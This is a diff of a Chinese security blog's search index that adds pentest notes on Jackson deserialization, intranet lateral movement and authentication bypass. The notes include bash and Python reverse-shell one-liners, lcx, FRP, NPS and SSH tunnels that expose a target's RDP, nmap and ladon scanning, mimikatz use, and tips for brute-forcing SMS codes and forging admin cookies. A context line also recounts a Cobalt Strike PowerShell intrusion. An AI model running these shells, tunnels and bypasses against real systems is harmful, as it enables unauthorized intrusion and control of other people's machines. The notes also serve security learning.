@@ -1,6 +1,218 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>反序列化漏洞积累</title>
+    <url>/2025/07/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="1-反序列化"><a href="#1-反序列化" class="headerlink" title="1-反序列化"></a>1-反序列化</h1><h2 id="1-jackson记录"><a href="#1-jackson记录" class="headerlink" title="[1] jackson记录"></a>[1] jackson记录</h2><p>以目的为导向就是，用[]进行测试判断该参数是否为object类型，是则用ssrf的payload</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;javax.swing.JEditorPane&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span><span class="attr">&quot;page&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://你的服务ip:8000&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>来测试是否存在jackson的反序列漏洞</p>
+<span id="more"></span>
+
+<h3 id="Jackson-反序列化漏洞原理"><a href="#Jackson-反序列化漏洞原理" class="headerlink" title="Jackson 反序列化漏洞原理"></a>Jackson 反序列化漏洞原理</h3><h5 id="1-1-多态反序列化（Polymorphic-Deserialization）"><a href="#1-1-多态反序列化（Polymorphic-Deserialization）" class="headerlink" title="1.1 多态反序列化（Polymorphic Deserialization）"></a>1.1 多态反序列化（Polymorphic Deserialization）</h5><p>Jackson 支持将 JSON 自动反序列化为多种类型的 Java 对象，特别是当某字段的类型为 <code>Object</code>、接口或抽象类时，Jackson 允许通过类型信息确定具体类。</p>
+<h5 id="常见两种类型标识方式："><a href="#常见两种类型标识方式：" class="headerlink" title="常见两种类型标识方式："></a>常见两种类型标识方式：</h5><ul>
+<li><p><strong>外部数组型标识（默认启用）</strong>：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>注解型标识（显式开启）</strong>：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@class&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.example.SomeClass&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;field&quot;</span><span class="punctuation">:</span> <span class="string">&quot;value&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>1.2 漏洞产生的根因</p>
+<ul>
+<li>Jackson 允许用户从 JSON 中指定任意类名。</li>
+<li>反序列化时会自动调用类的构造函数、setter 或 <code>readObject</code> 方法，甚至可能触发危险行为。</li>
+<li>攻击者可伪造 payload 利用 Gadget（利用链）执行任意代码。</li>
+</ul>
+<h5 id="1-3-默认-Typing-的影响"><a href="#1-3-默认-Typing-的影响" class="headerlink" title="1.3 默认 Typing 的影响"></a>1.3 默认 Typing 的影响</h5><p>如果后端配置了：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">mapper.enableDefaultTyping(); <span class="comment">// 旧版本默认启用</span></span><br></pre></td></tr></table></figure>
+
+<p>那么所有非 final 类型（如 Object、Map、List 等）都会被自动启用多态反序列化</p>
+<h3 id="—-Fastjson对比—"><a href="#—-Fastjson对比—" class="headerlink" title="—-Fastjson对比—-"></a>—-Fastjson对比—-</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>Jackson</th>
+<th>Fastjson</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>是否支持多态反序列化</td>
+<td>✅ 支持（默认 Object 类型自动支持）</td>
+<td>✅ 支持（需要特定字段）</td>
+</tr>
+<tr>
+<td>默认是否开启</td>
+<td>✅ <code>Object</code>, <code>Object[]</code> 自动支持多态</td>
+<td>❌ 需显示写入 <code>@type</code></td>
+</tr>
+<tr>
+<td>多态字段名称</td>
+<td>类名写在数组或配置的 <code>@class</code> 字段中</td>
+<td><strong>@type</strong>（固定字段名）</td>
+</tr>
+<tr>
+<td>利用条件</td>
+<td>字段为 Object 或接口（或启用了 DefaultTyping）</td>
+<td>JSON 中有 <code>@type</code> 且服务未禁用 AutoType</td>
+</tr>
+<tr>
+<td>修复方法</td>
+<td>禁用 DefaultTyping、白名单类</td>
+<td>关闭 <code>autoTypeSupport</code>、升级版本、白名单</td>
+</tr>
+<tr>
+<td>gadget 丰富程度</td>
+<td>中等（依赖 commons-* 等库）</td>
+<td>非常多（内置支持多类库）</td>
+</tr>
+</tbody></table>
+<h2 id="0-推荐工具利用"><a href="#0-推荐工具利用" class="headerlink" title="[0]推荐工具利用"></a>[0]推荐工具利用</h2><p><a href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
+<p>生成恶意 LDAP&#x2F;RMI 服务，配合 Java 反序列化漏洞实现 RCE</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Backend</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>emby逆向记录</title>
+    <url>/2025/06/24/emby%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/</url>
+    <content><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1-前言"></a>1-前言</h1><p>参考文章<a href="https://www.52pojie.cn/thread-1847431-1-1.html">破解Emby Server&#x2F;Client For iOS&#x2F;MacOS&#x2F;Linux&#x2F;Android 通杀方案 - 吾爱破解 - 52pojie.cn</a></p>
+<p>逆向案例，但好像也只解决的显示问题，对于硬解，可能需要搭建服务器传输必要参数内容才行。</p>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网横向+加固</title>
+    <url>/2025/06/24/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91-%E5%8A%A0%E5%9B%BA/</url>
+    <content><![CDATA[<h1 id="1-加固"><a href="#1-加固" class="headerlink" title="1-加固"></a>1-加固</h1><h2 id="Reverse-Shell定时任务"><a href="#Reverse-Shell定时任务" class="headerlink" title="Reverse Shell定时任务"></a>Reverse Shell定时任务</h2><h3 id="定时任务-系统级或用户级自启"><a href="#定时任务-系统级或用户级自启" class="headerlink" title="#定时任务&amp;系统级或用户级自启"></a>#定时任务&amp;系统级或用户级自启</h3><h5 id="反向ssh"><a href="#反向ssh" class="headerlink" title="#反向ssh"></a>#反向ssh</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh -R <span class="number">6000</span>:localhost:<span class="number">22</span> user@A的公网IP</span><br></pre></td></tr></table></figure>
+
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="#反弹shell"></a>#反弹shell</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>#python</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="使用-Zerotier-Tailscale-搭建虚拟局域网"><a href="#使用-Zerotier-Tailscale-搭建虚拟局域网" class="headerlink" title="#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网"></a>#使用 Zerotier &#x2F; Tailscale 搭建虚拟局域网</h5><p>或者使用sock代理，处于同一网络易漏扫，连接方式，下载<a href="https://github.com/idlefire/ew">EarthWorm</a></p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ew -s rcsocks -l <span class="number">1900</span> -e <span class="number">1200</span></span><br><span class="line">ew -s rssocks -d xxx.xxx.xxx.xxx(公网VPS IP) -e <span class="number">1200</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="内存码的注入"><a href="#内存码的注入" class="headerlink" title="#内存码的注入"></a>#内存码的注入</h5><h5 id="cs木马"><a href="#cs木马" class="headerlink" title="#cs木马"></a>#cs木马</h5><span id="more"></span>
+
+<h1 id="2-横向"><a href="#2-横向" class="headerlink" title="2-横向"></a>2-横向</h1><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="#内网探测"></a>#内网探测</h2><h5 id="探测主机-端口"><a href="#探测主机-端口" class="headerlink" title="#探测主机+端口"></a>#探测主机+端口</h5><p>详细可见另外一篇文章<a href="https://cliayn.github.io/2025/04/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">内网信息搜集</a></p>
+<p>若使用了sock，则直接使用nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br><span class="line"></span><br><span class="line">#端口扫描</span><br><span class="line">nmap -p 1-65535 192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">   #ladon上传到目标系统中，通过ladon扫描内网系统</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span>    OsScan	</span><br><span class="line">#直接漏扫</span><br><span class="line">landon <span class="number">192</span>.<span class="number">168</span>.<span class="number">200</span>.<span class="number">1</span>/<span class="number">24</span> 漏洞类型</span><br><span class="line">#连接sock5漏扫</span><br><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+
+<p>若没有，则使用ping</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.&#123;<span class="number">1</span>..<span class="number">254</span>&#125;; <span class="keyword">do</span> <span class="built_in">ping</span> -c <span class="number">1</span> -W <span class="number">1</span> $ip &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> &quot;$ip is up&quot;; done</span><br><span class="line"></span><br><span class="line">#查看arp缓存</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure>
+
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="#内网渗透"></a>#内网渗透</h2><h5 id="排查服务"><a href="#排查服务" class="headerlink" title="#排查服务"></a>#排查服务</h5><p>处于同一虚拟局域网内直接<strong>主机渗透</strong>和<strong>web渗透</strong></p>
+<h5 id="排查备份"><a href="#排查备份" class="headerlink" title="#排查备份"></a>#排查备份</h5><p>存在快照&#x2F;镜像直接拷贝本地运行</p>
+<h5 id="排查数据库"><a href="#排查数据库" class="headerlink" title="#排查数据库"></a>#排查数据库</h5><h5 id="排查敏感端口"><a href="#排查敏感端口" class="headerlink" title="#排查敏感端口"></a>#排查敏感端口</h5><h5 id="排查密码箱"><a href="#排查密码箱" class="headerlink" title="#排查密码箱"></a>#排查密码箱</h5><p>尝试mimikatz解密哈希</p>
+<h1 id="补充知识"><a href="#补充知识" class="headerlink" title="#补充知识"></a>#补充知识</h1><p>详细可见—戟星安全实验室的<a href="https://github.com/MrWQ/vulnerability-paper/blob/b60b05e87904b834ef707eaf18ca5c15eb972edf/intranet/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%EF%BC%8C%E4%BD%A0%E7%9F%A5%E9%81%93%E5%87%A0%E4%B8%AA%EF%BC%9F.md">内网隧道技术</a></p>
+<h2 id="1-lcx-隧道（针对-exe-工具的案例）"><a href="#1-lcx-隧道（针对-exe-工具的案例）" class="headerlink" title="1. lcx 隧道（针对 .exe 工具的案例）"></a>1. lcx 隧道（针对 .exe 工具的案例）</h2><p><strong>目标机器（受控端）执行：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 攻击机IP 9999 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将本地 3389 端口的连接转发至攻击机 IP:9999。</li>
+</ul>
+<p><strong>VPS 或攻击机（监听端）执行：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 9999 10000</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>监听 9999 端口接收隧道数据，并将其转发至本地 10000 端口。</li>
+</ul>
+<p><strong>连接方式：</strong></p>
+<ul>
+<li>在本机（或 VPS）通过 RDP 连接 <code>127.0.0.1:10000</code>，即可访问目标机器的 RDP 服务。</li>
+</ul>
+<hr>
+<h2 id="2-FRP-（fast-reverse-proxy）"><a href="#2-FRP-（fast-reverse-proxy）" class="headerlink" title="2. FRP （fast reverse proxy）"></a>2. FRP （fast reverse proxy）</h2><h3 id="服务端（公网-VPS）frps-配置"><a href="#服务端（公网-VPS）frps-配置" class="headerlink" title="服务端（公网 VPS）frps + 配置"></a>服务端（公网 VPS）frps + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
+
+<p>启动服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端（内网目标）frpc-配置"><a href="#客户端（内网目标）frpc-配置" class="headerlink" title="客户端（内网目标）frpc + 配置"></a>客户端（内网目标）frpc + 配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = &lt;VPS_IP&gt;</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 6000</span><br></pre></td></tr></table></figure>
+
+<p>启动客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="连接方式"><a href="#连接方式" class="headerlink" title="连接方式"></a>连接方式</h3><ul>
+<li>使用 RDP 客户端连接 <code>VPS_IP:6000</code>，即可访问目标机器的 RDP 服务 </li>
+<li><a href="https://www.junjienotes.com/tips/%E9%80%9A%E8%BF%87frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E7%8E%B0windows-rdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E6%8E%A7%E5%88%B6/?utm_source=chatgpt.com"><strong>通过FRP内网穿透实现Windows RDP远程桌面控制</strong></a></li>
+<li><a href="https://blog.csdn.net/qq_42688495/article/details/123120151?utm_source=chatgpt.com"><strong>FRP内网穿透</strong></a>。</li>
+</ul>
+<hr>
+<h2 id="3-NPS（内网穿透代理）"><a href="#3-NPS（内网穿透代理）" class="headerlink" title="3. NPS（内网穿透代理）"></a>3. NPS（内网穿透代理）</h2><h3 id="服务端（VPS）："><a href="#服务端（VPS）：" class="headerlink" title="服务端（VPS）："></a>服务端（VPS）：</h3><p>下载并运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./nps -c nps.conf</span><br></pre></td></tr></table></figure>
+
+<p>或安装为服务，访问 Web 控制面板配置端口转发 。</p>
+<p>您可在 Web 界面添加 TCP 映射，如映射内网主机的 3389 端口到公网端口。</p>
+<h3 id="客户端（内网目标）"><a href="#客户端（内网目标）" class="headerlink" title="客户端（内网目标）"></a>客户端（内网目标）</h3><p>编辑 <code>npc.conf</code>，指定要连接的 server 和 key，然后运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./npc -c npc.conf</span><br></pre></td></tr></table></figure>
+
+<p>完毕后即可通过映射的公网端口访问目标内网 RDP 服务 。</p>
+<hr>
+<h3 id="对比总结"><a href="#对比总结" class="headerlink" title="对比总结"></a>对比总结</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>架构</th>
+<th>配置方式</th>
+<th>优劣</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>lcx</td>
+<td>客户端 ↔ VPS ↔ 本地</td>
+<td>命令行参数</td>
+<td>简单直接，但需两个进程</td>
+</tr>
+<tr>
+<td>FRP</td>
+<td>frpc ↔ frps</td>
+<td>frp.ini 文件，支持多个隧道</td>
+<td>灵活、功能丰富</td>
+</tr>
+<tr>
+<td>NPS</td>
+<td>npc ↔ nps</td>
+<td>支持 Web 面板配置</td>
+<td>更方便管理，功能强大</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="使用建议"><a href="#使用建议" class="headerlink" title="*** 使用建议"></a>*** 使用建议</h3><ul>
+<li><strong>测试&#x2F;临时场景</strong>：lcx 非常直接，只需一条命令即可完成。</li>
+<li><strong>稳定&#x2F;多隧道需求</strong>：推荐 FRP，支持多个端口，配置灵活，兼容性广。</li>
+<li><strong>可视化管理&#x2F;复杂映射</strong>：NPS 带 Web 界面，适合多人协作和频繁配置调整。</li>
+</ul>
+<hr>
+<p><strong>扩展：SSH隧道示例</strong>（通用）：</p>
+<p><strong>客户端执行：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -R 6000:localhost:3389 user@VPS_IP</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将内网端 RDP 3389 转发到 VPS 的 6000 端口。</li>
+</ul>
+<p>在 VPS 使用 <code>localhost:6000</code> 即可访问目标。</p>
+<h2 id="内网穿透-总结"><a href="#内网穿透-总结" class="headerlink" title="#内网穿透-总结"></a>#内网穿透-总结</h2><p>说白了，内网穿透就是一个端口映射问题，</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Intranet</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>靶场练习-身份认证</title>
     <url>/2025/06/17/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="响应时间异常"><a href="#响应时间异常" class="headerlink" title="响应时间异常"></a>响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
@@ -8,17 +220,17 @@
 <table>
 <thead>
 <tr>
-<th align="center">含义</th>
 <th align="center">字段</th>
+<th align="center">含义</th>
 </tr>
 </thead>
 <tbody><tr>
+<td align="center"><strong>Response received</strong></td>
 <td align="center">收到响应头的时间（即服务端开始响应）</td>
-<td align="center">Response received</td>
 </tr>
 <tr>
+<td align="center"><strong>Response completed</strong></td>
 <td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
-<td align="center">Response completed</td>
 </tr>
 </tbody></table>
 <span id="more"></span>
@@ -32,8 +244,15 @@
 
 
 
-<h3 id="多因素认证"><a href="#多因素认证" class="headerlink" title="多因素认证"></a>多因素认证</h3><h5 id="利用因子：第二因素易绕过"><a href="#利用因子：第二因素易绕过" class="headerlink" title="利用因子：第二因素易绕过"></a>利用因子：第二因素易绕过</h5><p>例如：图形验证码可用captcha-killer插件绕过</p>
+<h3 id="—多因素认证—"><a href="#—多因素认证—" class="headerlink" title="—多因素认证—"></a>—多因素认证—</h3><hr>
+<h5 id="–-第二因素脆弱"><a href="#–-第二因素脆弱" class="headerlink" title="–!第二因素脆弱"></a>–!第二因素脆弱</h5><p>例如：图形验证码可用captcha-killer插件绕过，短信验证码4位数字可爆破</p>
 <p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
+<h5 id="–-第二因素不授权"><a href="#–-第二因素不授权" class="headerlink" title="–!第二因素不授权"></a>–!第二因素不授权</h5><p>即有缺陷的双因素验证逻辑</p>
+<p>有些应用你登录了就会给token，其他第二因素认证就是一个前端，直接绕过就行</p>
+<h5 id="–-token本身存在越权"><a href="#–-token本身存在越权" class="headerlink" title="–!token本身存在越权"></a>–!token本身存在越权</h5><p>例如cookie本身可解密，且包含用户信息，例如解密后，user&#x3D;test，直接改成user&#x3D;admin</p>
+<hr>
+<p><u>小技巧</u></p>
+<p>bp中存在session，可用用宏跑规定的请求包，替换session以保证服务正常运行，turbo intuder可用自定义python爆破</p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
@@ -710,7 +929,7 @@
 <p>（3）.<strong>基础操作</strong>：主机端口，内网web，系统&#x2F;框架漏洞</p>
 <p>(技巧)[<a href="https://www.cnblogs.com/backlion/category/1181220.html]">https://www.cnblogs.com/backlion/category/1181220.html]</a></p>
 <h2 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h2><p>1.通过fofa搜索到目标系统是采用weblogic框架，通过weblogic利用工具可执行命令，这里上传冰蝎一句话到目标网站系统。并查询到目标系统存在小众的防火墙，经测试该防火墙对ps脚本不拦截。</p>
-<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershel。</p>
+<p>2.在VPS上通过cd自带的Scripted Web Delivery模块，直接创建一个web服务用于一键下载和执行powershell。</p>
 <p>URL路径：&#x2F;a&#x2F;123   主机地址：目标系统IP   端口：80  监听器：https   类型：posershell</p>
 <p>3.执行powershel，然后CS成功上线。</p>
 <p>4.通过C命令查询目标系统信息,发现目标系统是win2012 ，目标内网IP为192.168.200.21</p>
